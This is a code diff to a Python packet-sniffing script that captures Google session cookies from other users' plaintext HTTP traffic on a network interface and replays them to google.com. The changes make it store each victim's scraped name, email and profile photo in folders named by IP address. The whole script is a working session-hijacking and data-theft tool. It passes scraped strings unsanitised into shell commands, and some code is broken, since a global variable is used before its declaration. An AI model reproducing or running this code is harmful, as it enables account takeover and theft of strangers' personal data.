@@ -3,6 +3,7 @@ import copy
 import dpkt
 import requests
 import sys
+import threading
 
 # necessary for accessing libdnet from within a virtualenv on OSX
 if sys.platform == "darwin":
@@ -14,6 +15,12 @@ session_ids =set() # a global set for all session ids
 user_packet ={}
 user_complete = {}
 user_start = {}
+counter = 0
+
+def subprocess_cmd(command):
+    process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
+    proc_stdout = process.communicate()[0].strip()
+
 
 
 def extract_google_stok(cookie):
@@ -28,40 +35,33 @@ def extract_google_stok(cookie):
 	else:
 		return session_tok
 
-def make_request(cookie):
+def make_request(cookie, user_ip):
+
+	print "making user request"
+	
 	url = 'http://www.google.com/?gws_rd=ssl'
 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
 	add_headers["Cookie"] = cookie
 	r = requests.get(url, headers=add_headers)
 	resp = r.content
 	soup = BeautifulSoup(resp, 'html.parser')
-
-
 	name_div = soup.findAll("div", { "class" : "gb_Cb"})
 	name = name_div[0].text
 	email_div = soup.findAll("div", { "class" : "gb_Db"})
 	email = email_div[0].text.split(" ")[0]
 	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
 
-	print name, email, usr_img
-
-	# subprocess.call(["mkdir",email])
-	# subprocess.call(['echo', name+'>'+name])
-	#subprocess.call(['curl', usr_img ">"+"./"+email+"/"+name+".jpg"])
-
-	# print "---"
-#	myname = mydivs.findAll("span")
-#	print myname[0].text
-
-
-
-
-
+	subprocess_cmd("mkdir -m 777 "+user_ip.split(":")[0])
+	subprocess_cmd("curl "+usr_img+" > ./"+user_ip.split(":")[0]+"/photo.jpg")
+	subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
+	subprocess_cmd("echo "+email+" > ./"+user_ip.split(":")[0]+"/email.txt")
 
 def extract_cookie(packet):
 
+	counter = counter+1
+	print counter
 	# provide access to globar variables
-	
+	global counter
 	global session_ids
 	global user_packet
 	global user_complete
@@ -73,16 +73,12 @@ def extract_cookie(packet):
 	dest_port = packet.sprintf("{TCP:%TCP.dport%}")
 
 	if dest_port != 'http': #fiter all all other traffic http traffic			
-		
 		return
-	
 	else:
-	
 		ip_src=packet.sprintf("{IP:%IP.src%}")
 		p_src=packet.sprintf("{TCP:%TCP.sport%}")
 		user_key = ip_src+":"+p_src
 		x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]
-
 
 		#create an entry for a user tuple
 		if 'GET /' in x and "host: www.google.com" in x.lower() and user_key not in user_packet:
@@ -111,7 +107,6 @@ def extract_cookie(packet):
 				del user_start[user_key]
 				user_complete[user_key] = 1
 
-
 		#make a replay request once the packet is complete
 		if user_key in user_complete:
 
@@ -127,19 +122,20 @@ def extract_cookie(packet):
 				if s_tok not in session_ids and s_tok != None:
 		  			session_ids.update([s_tok])
 		 			temp_cookie = cookie_str.split(": ")[1].replace("\r\n","\\r\\n")
-		 			make_request(temp_cookie)
+
+		 			thread = threading.Thread(target=make_request, args=(temp_cookie, user_key))
+					thread.daemon = True                     
+					thread.start()
 
 				if user_complete[user_key] == 1:
 					del user_complete[user_key]
 					del	user_packet[user_key]
 
-		print user_packet, user_complete, user_start
-
 
 def main():
 	interface = sys.argv[1]
 	print interface
-	sniff(iface=interface, prn=extract_cookie, filter = "port 80")
+	sniff(iface=interface, prn=extract_cookie)
 	# stream_object= open_capture(interface)
 	# stream_object.loop(-1, recieve_packets) # capture packets
 
